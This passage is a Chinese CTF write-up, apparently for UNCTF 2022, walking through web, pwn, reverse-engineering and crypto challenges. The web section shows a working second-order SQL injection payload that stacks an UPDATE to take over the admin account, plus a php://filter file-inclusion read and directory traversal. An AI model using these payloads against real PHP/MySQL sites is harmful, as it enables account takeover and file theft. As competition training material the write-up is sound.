<p>首先可以看一下<code>login.php</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]!==<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;想什么呢，好好做题吧!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$studentid</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and studentid=&#x27;<span class="subst">$studentid</span>&#x27;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]));</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = (<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;studentid&#x27;</span>] = (<span class="variable">$row</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;用户名或密码错误捏&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察了一下，似乎无法直接绕过检查以admin的身份登录，那么只能从别的地方下手了。</p>
<p>继续审代码发现突破口：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from score where username=&#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows) &#123;</span><br><span class="line">            <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;用户已完成考试\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$query</span> = <span class="string">&quot;insert into score values (NULL, &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;, <span class="subst">$getscroe</span>);insert into userAnswer values (NULL, &#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q4&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q5&#x27;</span>].<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$query</span>)===<span class="literal">TRUE</span>) &#123;</span><br><span class="line">                <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;已完成考试！\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script language=&#x27;JavaScript&#x27;&gt;location.replace(&#x27;index.php&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重点在于下面这条语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert into score values (NULL, &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;, <span class="subst">$getscroe</span>);insert into userAnswer values (NULL, &#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q4&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q5&#x27;</span>].<span class="string">&quot;&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这里的<code>$_SESSION[&#39;username&#39;]</code>是我们在登录时的用户名，在我们答完题之后，就会执行这条语句，将我们的答案记录在数据库中，但是注意，第一条插入语句中存在<code>addslasher_deep()</code>来转义字符限制了注入，但第二条没有，这恰恰是我们可以利用的点。</p>
<p>构造payload如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>zeroc<span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;);update users set studentid=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where username=&#x27;</span>admin<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>
<p>那么插入语句就变成了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userAnswer <span class="keyword">values</span> (<span class="keyword">NULL</span>, <span class="string">&#x27;zeroc&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);<span class="keyword">update</span> users <span class="keyword">set</span> studentid<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;#</span><br></pre></td></tr></table></figure>
<p>这样我们就将admin的学号修改为123456，接下来直接登录后查询成绩即可得到flag。</p>
<p>首先注册<code>username=zeroc&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;);update users set studentid=&#39;123456&#39; where username=&#39;admin&#39;;#</code>的用户：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055804.png" alt=""></p>
<p>答完题之后登出，直接使用<code>admin</code>和<code>123456</code>登录admin：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055582.png" alt=""></p>
<p>接着查询admin的成绩即可得到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055456.png" alt=""></p>
<p>这道题是<code>NepCTF</code>中一道二次注入加udf提权的极简版，可以参考这篇文章：<a target="_blank" rel="noopener" href="https://err0r.top/article/eruditeFlower/#">https://err0r.top/article/eruditeFlower/#</a></p>
<h3 id="快乐三消"><a href="#快乐三消" class="headerlink" title="快乐三消"></a>快乐三消</h3><p>题目提示备份泄露和目录扫描，那就先扫一扫：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055269.png" alt=""></p>
<p>扫出来一个登录界面，结合备份泄露，访问<code>/admin/login.php.bak</code>得到登录账号和密码：<code>admin</code>、<code>unctf</code>。</p>
<p>登录后进行了一些操作无果，简单地看看页面源码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055544.png" alt=""></p>
<p>发现关键信息：<code>fi.php?filename=index.php</code>，访问一下还是原来那个界面，猜想可能存在文件包含，试试伪协议读取<code>fi.php</code>的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/fi.php?filename=php://filter/read=convert.base64-encode/resource=fi.php</span><br></pre></td></tr></table></figure>
<p>解码后得到：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055703.png" alt=""></p>
<p>确实存在文件包含漏洞，那么直接利用目录遍历访问根目录下的flag试试：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054657.png" alt=""></p>
<p>得到flag。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>因为前几题没涉及到栈啥的，就做了做，第三道栈迁移还差一点做出来（</p>
<h3 id="WelcomeUNCTF2022"><a href="#WelcomeUNCTF2022" class="headerlink" title="WelcomeUNCTF2022"></a>WelcomeUNCTF2022</h3><p>简单的签到题，丢进IDA一看：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054789.png" alt=""></p>
<p>输入<code>UNCTF&amp;2022</code>即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054006.png" alt=""></p>
<h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>丢进IDA：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054051.png" alt=""></p>
<p>关键函数<code>playgame</code>:</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054550.png" alt=""></p>
<p>已知随机数种子，生成了100个随机数序列，0——石头，1——剪刀，2——布，只需要赢100次即可，注意这里生成的随机数需要在linux环境下。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>, <span class="number">32164</span>)</span><br><span class="line">c = <span class="string">b&#x27;y&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;1122022122220021012001111211100201200102121201110020212100221121222210202001222001010020100211110112&#x27;</span></span><br><span class="line"><span class="comment"># 0石头1剪刀2布</span></span><br><span class="line"><span class="comment"># 0-&gt;2 1-&gt;0 2-&gt;1</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;2&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r.sendline(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(i.encode()))</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># UNCTF&#123;c6f70cf1-009a-46ab-bb3d-deb6912ca004&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>只会做签到（</p>
<h3 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h3><p>丢进IDA：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054242.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054230.png" alt=""></p>
<p>小逆一下即可。</p>
<p>EXP:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ooooo</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (a1 == <span class="number">109</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">109</span>;</span><br><span class="line">    <span class="keyword">if</span> (a1 &lt;= <span class="number">111</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a1 &lt;= <span class="number">110</span>)</span><br><span class="line">            a1 -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        a1 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v5[<span class="number">10</span>];</span><br><span class="line">    v5[<span class="number">0</span>] = <span class="number">118</span>;</span><br><span class="line">    v5[<span class="number">1</span>] = <span class="number">103</span>;</span><br><span class="line">    v5[<span class="number">2</span>] = <span class="number">112</span>;</span><br><span class="line">    v5[<span class="number">3</span>] = <span class="number">107</span>;</span><br><span class="line">    v5[<span class="number">4</span>] = <span class="number">99</span>;</span><br><span class="line">    v5[<span class="number">5</span>] = <span class="number">109</span>;</span><br><span class="line">    v5[<span class="number">6</span>] = <span class="number">104</span>;</span><br><span class="line">    v5[<span class="number">7</span>] = <span class="number">110</span>;</span><br><span class="line">    v5[<span class="number">8</span>] = <span class="number">99</span>;</span><br><span class="line">    v5[<span class="number">9</span>] = <span class="number">105</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        v5[i] = ooooo(v5[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v5[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># UNCTF&#123;yesiamflag&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>感觉这次Crypto偏脑洞，一些题也是脚本一把梭的（</p>
<h3 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="string">&#x27;x&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="comment"># x不是一个字符是n个字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">        file.write(md5(i.encode()).hexdigest()+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>还给了个out.txt，直接爆破即可：</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/crypto-md5-1/out.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.&#123;-1234567890&#125;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(<span class="built_in">chr</span>(j).encode()).hexdigest() == i.strip():</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a>dddd</h3><p>给了一串01串，一眼摩斯码，写个脚本转换跑就行。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">MorseList = &#123;</span><br><span class="line">    <span class="string">&quot;.-&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;-...&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;-.-.&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;-..&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;..-.&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;--.&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">    <span class="string">&quot;....&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;..&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;.---&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-.-&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;.-..&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;--&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;-.&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    <span class="string">&quot;---&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;.--．&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;--.-&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;.-.&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;...&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">    <span class="string">&quot;..-&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;...-&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;.--&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;-..-&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;-.--&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;--..&quot;</span>: <span class="string">&quot;Z&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;-----&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;.----&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;..---&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;...--&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;....-&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.....&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;-....&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;--...&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;---..&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;----.&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;.-.-.-&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;---...&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;--..--&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;-.-.-.&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;..--..&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-...-&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;.----.&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;-..-.&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;-.-.--&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;-....-&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;..--.-&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.-..-.&quot;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;-.--.&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;-.--.-&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;...-..-&quot;</span>: <span class="string">&quot;$&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.--.-.&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;.-.-.&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-----.-&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;----.--&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">morse</span>(<span class="params">string, sign</span>):</span><br><span class="line">    <span class="comment"># 分割，字符串string，分割标识符sign</span></span><br><span class="line">    lists = string.split(sign)</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> lists:</span><br><span class="line">        <span class="built_in">print</span>(MorseList.get(code), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;110/01/0101/0/1101/0000100/0100/11110/111/110010/0/1111/10000/111/110010/1000/110/111/0/110010/00/00000/101/111/1/0000010&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += i</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">morse(res, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="comment"># UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="caeser"><a href="#caeser" class="headerlink" title="caeser"></a>caeser</h3><p>凯撒密码，表换成base64的表，正常解即可。</p>
<p>EXP:</p>
